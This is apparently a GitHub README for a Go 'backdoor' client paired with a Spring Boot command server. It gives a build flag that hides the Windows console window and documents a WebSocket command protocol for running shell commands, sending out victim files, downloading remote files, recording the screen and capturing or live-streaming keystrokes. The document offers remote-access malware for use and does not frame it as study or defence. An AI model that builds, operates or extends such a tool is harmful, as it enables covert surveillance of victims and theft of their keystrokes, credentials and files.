# marauders-map-client-desktop
A multiplatform WOCA backdoor written in Go

Download here the [Spring Boot Server](https://github.com/apal7/marauders-map)

### Windows
For hidden shell window, build as follows:
```
go build -ldflags -H=windowsgui main.go
```

### API over Websocket connection
```json
// ========================================
// BASH operations
// ========================================

// Request a bash execution to a client
// @reqid: request ID from server
// @cmd: the command
// @data: the shell command splitted into parts; must be joined
{
	"reqid": 	"123456",
	"cmd": 		"bash",
	"data": [
		"mkdir",
		"DirectoryName"
	]
}


// ========================================
// FILE Operations
// ========================================

// Request a client a file from its diretory
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @files: files to send; path could be relative or absolute
{
	"reqid": 	"123456",
	"cmd": 		"file",
	"action": 	"send",
	"files": [
		"FileName1",
		"Filename2"
	]
}

// Request a client to download a file from an URL
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @files: URL of files to download
{
	"reqid": 	"123456",
	"cmd": 		"file",
	"action":	"download",
	"files": [
		"http://example.com/url/path/to/file.txt",
		"http://example.com/url/path/to/file2.format"
	]
}


// ========================================
// Screen Operations
// ========================================

// Request a client to start recording its screen
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
// @seconds: how much time will be executing this
{
	"reqid": 			"123456",
	"cmd": 				"screen",
	"action": 			"record",
	"action_status": 	"start",
	"seconds": 			15
}

// Request a client to stop recording its screen
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
// @seconds: must be null if you want to stop recording
{
	"reqid": 			"123456",
	"cmd": 				"screen",
	"action": 			"record",
	"action_status": 	"stop",
	"seconds": 			null
}

// Request a client to send a screenshot
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
// @seconds: must be null if you want to stop recording
{
	"reqid": 			"123456",
	"cmd": 				"screen",
	"action": 			"screenshot",
	"action_status": 	null,
	"seconds": 			null
}


// ========================================
// Keylogger Operations
// ========================================

// Request a client to start recording its keyboard
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
// @seconds: how much time will be executing this; if null, indefinitely
{
	"reqid": 			"123456",
	"cmd": 				"kl",
	"action": 			"record",
	"action_status": 	"start",
	"seconds": 			null
}

// Request a client to stop recording its keyboard
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
{
	"reqid": 			"123456",
	"cmd": 				"kl",
	"action": 			"record",
	"action_status": 	"stop"
}

// Request a client to start to send its keystrokes in live
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
{
	"reqid": 			"123456",
	"cmd": 				"kl",
	"action": 			"stream",
	"action_status": 	"start"
}

// Request a client to stop to send its keystrokes in live
// @reqid: request ID from server
// @cmd: the command
// @action: the command action
// @action_status: the status of the action
{
	"reqid": 			"123456",
	"cmd": 				"kl",
	"action": 			"stream",
	"action_status": 	"stop"
}
```
